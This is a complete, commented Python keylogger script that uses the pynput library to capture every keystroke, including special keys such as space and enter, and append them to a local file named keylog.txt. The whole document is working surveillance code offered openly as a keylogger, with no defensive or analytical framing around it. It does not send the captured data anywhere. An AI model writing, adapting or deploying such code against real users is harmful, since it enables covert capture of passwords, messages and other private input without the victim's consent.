import pynput.keyboard

# Define the file where keystrokes will be logged
log_file = "keylog.txt"

# Initialize an empty string to hold the log data
log = ""

# Define a callback function to process each key press
def on_press(key):
    global log

    try:
        # If a key is printable, append its character representation
        log += key.char
    except AttributeError:
        # If it's a special key (like space, enter, etc.), append a readable string
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n"
        else:
            log += f" [{key}] "

    # Write the log to the file
    with open(log_file, "a") as f:
        f.write(log)
        log = ""  # Clear the log after writing

# Define a callback function to process key release (optional)
def on_release(key):
    # You can add functionality here if needed, like stopping the keylogger on a specific key
    pass

# Use the pynput library to listen to keyboard events
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
